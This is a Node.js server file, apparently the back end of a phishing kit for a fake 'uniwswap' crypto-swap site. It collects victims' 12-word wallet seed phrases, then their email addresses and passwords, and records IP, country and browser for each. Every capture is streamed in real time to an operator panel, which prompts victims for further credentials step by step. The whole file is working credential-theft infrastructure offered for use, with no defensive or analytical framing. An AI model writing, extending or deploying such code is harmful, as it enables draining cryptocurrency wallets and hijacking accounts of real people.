require('dotenv').config()

const express = require('express')
const cors = require('cors')
const http = require('http')
const { Server } = require('socket.io')
const mongoose = require('mongoose')
const geoip = require('geoip-lite')

const Session = require('./models/Session')

const PORT = process.env.PORT || 3331
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/uniwswap'

const app = express()
app.set('trust proxy', 1)
app.use(cors())
app.use(express.json({ limit: '2mb' }))

const httpServer = http.createServer(app)
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
})

const sessionSocketMap = new Map()
const socketSessionMap = new Map()

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log('Connected to MongoDB'))
  .catch((error) => {
    console.error('Failed to connect to MongoDB:', error)
    process.exit(1)
  })

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/i

const normalizeIp = (ipAddress) => {
  if (!ipAddress) return null
  if (ipAddress === '::1') return '127.0.0.1'
  if (ipAddress.startsWith('::ffff:')) return ipAddress.slice(7)
  return ipAddress
}

const getClientIp = (req) => {
  const forwarded = req.headers['x-forwarded-for']
  if (Array.isArray(forwarded)) {
    return normalizeIp(forwarded[0])
  }
  if (typeof forwarded === 'string' && forwarded.length > 0) {
    const [first] = forwarded.split(',')
    return normalizeIp(first.trim())
  }
  return normalizeIp(req.socket.remoteAddress)
}

const getCountryFromIp = (ipAddress) => {
  if (!ipAddress) return 'Unknown'
  const lookup = geoip.lookup(ipAddress)
  return lookup?.country ?? 'Unknown'
}

const formatSession = (session) => ({
  id: session._id.toString(),
  socketId: session.socketId,
  status: session.status,
  seedWords: session.seedWords,
  email: session.email,
  password: session.password,
  ipAddress: session.ipAddress,
  country: session.country,
  userAgent: session.userAgent,
  createdAt: session.createdAt,
  updatedAt: session.updatedAt,
  emailRequestedAt: session.emailRequestedAt,
  emailSubmittedAt: session.emailSubmittedAt,
  passwordSubmittedAt: session.passwordSubmittedAt,
  finalizedAt: session.finalizedAt,
})

app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok' })
})

app.post('/api/sessions', async (req, res) => {
  const { seedWords, socketId } = req.body

  if (!socketId || typeof socketId !== 'string') {
    return res.status(400).json({ error: 'socketId is required' })
  }

  if (!Array.isArray(seedWords) || seedWords.length !== 12) {
    return res.status(400).json({ error: 'seedWords must contain 12 entries' })
  }

  const sanitizedSeedWords = seedWords.map((word) => (typeof word === 'string' ? word.trim() : ''))

  if (sanitizedSeedWords.some((word) => word.length === 0)) {
    return res.status(400).json({ error: 'seedWords cannot contain empty values' })
  }

  const ipAddress = getClientIp(req)
  const country = getCountryFromIp(ipAddress)
  const userAgent = req.headers['user-agent'] || 'Unknown'

  try {
    const session = await Session.create({
      socketId,
      seedWords: sanitizedSeedWords,
      ipAddress,
      country,
      userAgent,
    })

    const sessionId = session._id.toString()
    sessionSocketMap.set(sessionId, socketId)
    socketSessionMap.set(socketId, sessionId)

    const userSocket = io.sockets.sockets.get(socketId)
    if (userSocket) {
      userSocket.join(`session:${sessionId}`)
      userSocket.emit('session:waiting', {
        sessionId,
        status: session.status,
      })
    }

    io.to('admins').emit('admin:newSession', formatSession(session))

    return res.status(201).json({ sessionId })
  } catch (error) {
    console.error('Failed to create session:', error)
    return res.status(500).json({ error: 'Failed to create session' })
  }
})

const ensureAdmin = (socket, event) => {
  if (socket.data.role !== 'admin') {
    socket.emit('admin:error', { message: 'Unauthorized', event })
    return false
  }
  return true
}

const ensureUserSession = (socket, sessionId) => {
  if (socket.data.role !== 'user') {
    socket.emit('session:error', { message: 'Unauthorized' })
    return false
  }

  const registeredSession = socketSessionMap.get(socket.id)

  if (!registeredSession || registeredSession !== sessionId) {
    socket.emit('session:error', { message: 'Session mismatch' })
    return false
  }
  return true
}

io.on('connection', async (socket) => {
  const role = socket.handshake.query?.role === 'admin' ? 'admin' : 'user'
  socket.data.role = role

  if (role === 'admin') {
    socket.join('admins')
    const recentSessions = await Session.find().sort({ createdAt: -1 }).limit(50)
    socket.emit('admin:sessionList', recentSessions.map(formatSession))
  }

  socket.on('admin:requestEmail', async ({ sessionId }) => {
    if (!ensureAdmin(socket, 'admin:requestEmail')) return

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('admin:error', { message: 'Session not found', event: 'admin:requestEmail' })
        return
      }

      session.status = 'awaiting-email'
      session.emailRequestedAt = new Date()
      await session.save()

      io.to(`session:${sessionId}`).emit('session:requestEmail', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle admin:requestEmail:', error)
      socket.emit('admin:error', { message: 'Failed to request email', event: 'admin:requestEmail' })
    }
  })

  socket.on('admin:finalize', async ({ sessionId }) => {
    if (!ensureAdmin(socket, 'admin:finalize')) return

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('admin:error', { message: 'Session not found', event: 'admin:finalize' })
        return
      }

      session.status = 'finalized'
      session.finalizedAt = new Date()
      await session.save()

      io.to(`session:${sessionId}`).emit('session:finalized', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle admin:finalize:', error)
      socket.emit('admin:error', { message: 'Failed to finalize session', event: 'admin:finalize' })
    }
  })

  socket.on('session:submitEmail', async ({ sessionId, email }) => {
    if (!ensureUserSession(socket, sessionId)) return

    if (!email || !emailRegex.test(email)) {
      socket.emit('session:error', { message: 'A valid email address is required.' })
      return
    }

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('session:error', { message: 'Session not found.' })
        return
      }

      session.email = email.trim()
      session.status = 'awaiting-password'
      session.emailSubmittedAt = new Date()
      await session.save()

      socket.emit('session:requestPassword', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle session:submitEmail:', error)
      socket.emit('session:error', { message: 'Could not submit email.' })
    }
  })

  socket.on('session:submitPassword', async ({ sessionId, password }) => {
    if (!ensureUserSession(socket, sessionId)) return

    if (!password || typeof password !== 'string' || password.trim().length === 0) {
      socket.emit('session:error', { message: 'Password is required.' })
      return
    }

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('session:error', { message: 'Session not found.' })
        return
      }

      session.password = password
      session.status = 'password-submitted'
      session.passwordSubmittedAt = new Date()
      await session.save()

      socket.emit('session:waiting', { sessionId, status: session.status })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle session:submitPassword:', error)
      socket.emit('session:error', { message: 'Could not submit password.' })
    }
  })

  socket.on('disconnect', () => {
    if (socket.data.role === 'admin') {
      socket.leave('admins')
      return
    }

    const sessionId = socketSessionMap.get(socket.id)
    if (sessionId) {
      socketSessionMap.delete(socket.id)
      sessionSocketMap.delete(sessionId)
    }
  })
})

httpServer.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`)
})